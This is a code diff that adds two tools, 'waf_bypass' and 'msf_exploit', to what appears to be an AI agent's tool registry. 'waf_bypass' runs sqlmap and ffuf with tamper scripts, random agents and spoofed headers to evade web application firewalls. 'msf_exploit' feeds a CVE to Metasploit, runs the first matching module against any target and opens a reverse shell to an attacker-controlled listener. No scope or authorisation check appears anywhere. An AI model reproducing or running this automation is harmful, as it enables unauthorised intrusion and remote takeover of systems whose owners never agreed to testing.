@@ -388,6 +388,31 @@ TOOLS = {
             "required": ["target"]
         }
     },
+    "waf_bypass": {
+        "description": "Detect WAF and apply automatic bypass techniques. Uses wafw00f to identify WAF, then runs sqlmap/ffuf/nuclei with tamper scripts, random agents, and evasion flags to bypass protection.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target": {"type": "string", "description": "Target URL (e.g. http://site.com/page?id=1)"},
+                "mode":   {"type": "string", "description": "Bypass mode: detect (just detect WAF), sqli (bypass+SQLi), fuzz (bypass+dir fuzz), full (all). Default: full"}
+            },
+            "required": ["target"]
+        }
+    },
+    "msf_exploit": {
+        "description": "Automated CVE exploitation using Metasploit Framework. Given a CVE or service, searches for exploit modules, configures RHOST/LHOST and runs the exploit.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target": {"type": "string", "description": "Target IP or hostname"},
+                "cve":    {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228) or search term (e.g. ms17-010, eternalblue)"},
+                "lhost":  {"type": "string", "description": "Attacker IP for reverse shell (default: auto-detect via 'hostname -I')"},
+                "lport":  {"type": "string", "description": "Listener port (default: 4444)"},
+                "flags":  {"type": "string", "description": "Extra msfconsole options"}
+            },
+            "required": ["target", "cve"]
+        }
+    },
     "ghauri": {
         "description": "Advanced SQL injection detection and exploitation tool. Modern alternative to sqlmap with better bypass techniques for WAFs.",
         "input_schema": {
@@ -577,6 +602,43 @@ def build_command(tool, args):
     elif tool == "ghauri":
         flags = args.get("flags", "--batch --dbs")
         return f"ghauri -u {shlex.quote(args['url'])} {flags} 2>&1 | head -100"
+
+    elif tool == "waf_bypass":
+        target = shlex.quote(args['target'])
+        mode   = args.get("mode", "full")
+        cmds   = [f"echo '=== WAF DETECTION ===' && wafw00f {target} 2>&1 | tail -20"]
+        if mode in ("sqli", "full"):
+            cmds.append(
+                f"echo '=== SQLi BYPASS ===' && sqlmap -u {target} "
+                f"--tamper=space2comment,charencode,randomcase,between,equaltolike "
+                f"--random-agent --level=3 --risk=2 --batch --timeout=15 "
+                f"--retries=2 2>&1 | tail -40"
+            )
+        if mode in ("fuzz", "full"):
+            cmds.append(
+                f"echo '=== DIR FUZZ BYPASS ===' && ffuf -u {target.strip(chr(39))}/FUZZ "
+                f"-w /usr/share/seclists/Discovery/Web-Content/common.txt "
+                f"-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)' "
+                f"-H 'X-Forwarded-For: 127.0.0.1' -mc 200,201,301,302,403 -fc 404 "
+                f"-t 20 -timeout 10 2>&1 | head -50"
+            )
+        return " && ".join(cmds)
+
+    elif tool == "msf_exploit":
+        target = shlex.quote(args['target'])
+        cve    = args.get("cve", "").replace("CVE-", "cve:").lower()
+        lhost  = args.get("lhost", "$(hostname -I | awk '{print $1}')")
+        lport  = args.get("lport", "4444")
+        msf_cmds = (
+            f"search {cve}; "
+            f"use 0; "
+            f"set RHOSTS {args['target']}; "
+            f"set LHOST {lhost}; "
+            f"set LPORT {lport}; "
+            f"set VERBOSE false; "
+            f"run; exit"
+        )
+        return f"msfconsole -q -x {shlex.quote(msf_cmds)} 2>&1 | head -100"
 
     elif tool == "httpx":
         flags = args.get("flags", "-title -tech-detect -status-code -ip -silent")
